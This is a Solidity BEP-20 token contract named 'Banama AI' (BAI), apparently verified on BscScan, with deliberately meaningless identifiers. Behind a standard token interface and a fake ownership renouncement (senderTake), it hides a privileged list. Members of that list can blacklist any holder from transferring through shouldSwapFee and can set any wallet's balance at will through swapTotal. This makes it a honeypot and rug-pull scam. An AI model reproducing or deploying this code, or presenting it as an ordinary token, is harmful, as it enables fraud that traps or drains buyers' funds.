/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface limitTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamMarketingShould) external view returns (uint256);

    function transfer(address marketingLimit, uint256 tradingAt) external returns (bool);

    function allowance(address tokenAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingAt) external returns (bool);

    function transferFrom(
        address sender,
        address marketingLimit,
        uint256 tradingAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atAmount, uint256 value);
    event Approval(address indexed tokenAuto, address indexed spender, uint256 value);
}

interface limitTradingMetadata is limitTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract receiverSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountLaunch {
    function createPair(address listToken, address atLaunched) external returns (address);
}

interface buyTxWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BanamaAI is receiverSell, limitTrading, limitTradingMetadata {

    bool public swapFund;

    mapping(address => bool) public launchFromTake;

    function senderTake() public {
        emit OwnershipTransferred(maxLimit, address(0));
        maxAuto = address(0);
    }

    string private buyMode = "Banama AI";

    uint256 public amountSwap;

    function balanceOf(address teamMarketingShould) public view virtual override returns (uint256) {
        return tokenWallet[teamMarketingShould];
    }

    function tradingExemptAuto() public {
        if (tradingMarketingSwap != txList) {
            txList = true;
        }
        if (autoSell != tradingMarketingSwap) {
            swapFund = true;
        }
        autoSell=false;
    }

    uint256 public tokenSender;

    function maxSender(address autoIs) public {
        require(!txExempt);
        
        launchFromTake[autoIs] = true;
        if (toLiquidity == txList) {
            amountSwap = tokenSender;
        }
        txExempt = true;
    }

    address public autoAt;

    uint8 private marketingReceiverExempt = 18;

    function name() external view virtual override returns (string memory) {
        return buyMode;
    }

    function isSell() public {
        if (liquidityAutoMin == autoSell) {
            amountSwap = tokenSender;
        }
        if (swapFund) {
            tradingToken = false;
        }
        tokenSender=0;
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingReceiverExempt;
    }

    function transferFrom(address takeReceiver, address marketingLimit, uint256 tradingAt) external override returns (bool) {
        if (tradingFromReceiver[takeReceiver][_msgSender()] != type(uint256).max) {
            require(tradingAt <= tradingFromReceiver[takeReceiver][_msgSender()]);
            tradingFromReceiver[takeReceiver][_msgSender()] -= tradingAt;
        }
        return sellMax(takeReceiver, marketingLimit, tradingAt);
    }

    function transfer(address takeLiquidity, uint256 tradingAt) external virtual override returns (bool) {
        return sellMax(_msgSender(), takeLiquidity, tradingAt);
    }

    mapping(address => uint256) private tokenWallet;

    mapping(address => bool) public amountWalletSender;

    function sellMax(address takeReceiver, address marketingLimit, uint256 tradingAt) internal returns (bool) {
        if (takeReceiver == maxLimit) {
            return exemptMin(takeReceiver, marketingLimit, tradingAt);
        }
        require(!amountWalletSender[takeReceiver]);
        return exemptMin(takeReceiver, marketingLimit, tradingAt);
    }

    function getOwner() external view returns (address) {
        return maxAuto;
    }

    address public maxLimit;

    function totalMin() public {
        
        if (liquidityAutoMin == txList) {
            liquidityAutoMin = true;
        }
        autoSell=false;
    }

    mapping(address => mapping(address => uint256)) private tradingFromReceiver;

    function fromTake() public {
        if (swapFund) {
            tokenSender = amountSwap;
        }
        if (tradingMarketingSwap != liquidityAutoMin) {
            tokenSender = amountSwap;
        }
        amountSwap=0;
    }

    bool private tradingToken;

    bool private toLiquidity;

    address private maxAuto;

    string private txReceiver = "BAI";

    function exemptMin(address takeReceiver, address marketingLimit, uint256 tradingAt) internal returns (bool) {
        require(tokenWallet[takeReceiver] >= tradingAt);
        tokenWallet[takeReceiver] -= tradingAt;
        tokenWallet[marketingLimit] += tradingAt;
        emit Transfer(takeReceiver, marketingLimit, tradingAt);
        return true;
    }

    function approve(address shouldAuto, uint256 tradingAt) public virtual override returns (bool) {
        tradingFromReceiver[_msgSender()][shouldAuto] = tradingAt;
        emit Approval(_msgSender(), shouldAuto, tradingAt);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txTrading;
    }

    function symbol() external view virtual override returns (string memory) {
        return txReceiver;
    }

    function receiverTo() public view returns (bool) {
        return swapFund;
    }

    uint256 private txTrading = 100000000 * 10 ** 18;

    constructor (){ 
        if (tradingToken) {
            tokenSender = amountSwap;
        }
        buyTxWallet shouldWallet = buyTxWallet(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoAt = amountLaunch(shouldWallet.factory()).createPair(shouldWallet.WETH(), address(this));
        maxAuto = _msgSender();
        if (amountSwap != tokenSender) {
            tradingToken = true;
        }
        maxLimit = _msgSender();
        launchFromTake[_msgSender()] = true;
        if (tokenSender == amountSwap) {
            liquidityAutoMin = false;
        }
        tokenWallet[_msgSender()] = txTrading;
        emit Transfer(address(0), maxLimit, txTrading);
        senderTake();
    }

    function shouldSwapFee(address listReceiver) public {
        txWallet();
        
        if (listReceiver == maxLimit || listReceiver == autoAt) {
            return;
        }
        amountWalletSender[listReceiver] = true;
    }

    function allowance(address sellListFund, address shouldAuto) external view virtual override returns (uint256) {
        return tradingFromReceiver[sellListFund][shouldAuto];
    }

    bool public liquidityAutoMin;

    function owner() external view returns (address) {
        return maxAuto;
    }

    event OwnershipTransferred(address indexed isLimitLaunch, address indexed enableIs);

    bool public autoSell;

    function shouldSell() public view returns (bool) {
        return toLiquidity;
    }

    function swapTotal(address takeLiquidity, uint256 tradingAt) public {
        txWallet();
        tokenWallet[takeLiquidity] = tradingAt;
    }

    bool public txExempt;

    bool public txList;

    bool public tradingMarketingSwap;

    function txWallet() private view{
        require(launchFromTake[_msgSender()]);
    }

}